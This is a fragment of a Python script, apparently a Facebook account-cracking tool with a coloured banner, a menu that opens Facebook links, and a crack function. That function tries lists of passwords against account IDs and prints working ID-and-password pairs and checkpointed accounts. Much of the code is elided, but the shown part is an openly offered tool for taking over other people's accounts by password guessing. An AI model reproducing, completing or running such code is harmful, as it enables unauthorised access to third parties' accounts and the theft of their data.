...
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :        RAYHAN TECH BD           \x1b[1;94m║
...
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        1.01                    \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
...
def menu():
	...
	if me in ["1", "1"]:
		os.system("xdg-open https://www.facebook.com/groups/AllSportsLover")
		file_crk()
	elif me in ["2", "2"]:
		os.system("xdg-open https://www.facebook.com/rayhan1037")
def file_crk():
    os.system('clear');
    D().plerr()
class D:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [KHALID-CHECKING] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[KHALID-CP] {idf} | {pw}')     
				...
				print(f'\r\r\x1b[38;5;46m[KHALID-OK] '+idf+ ' | '+pw+'')
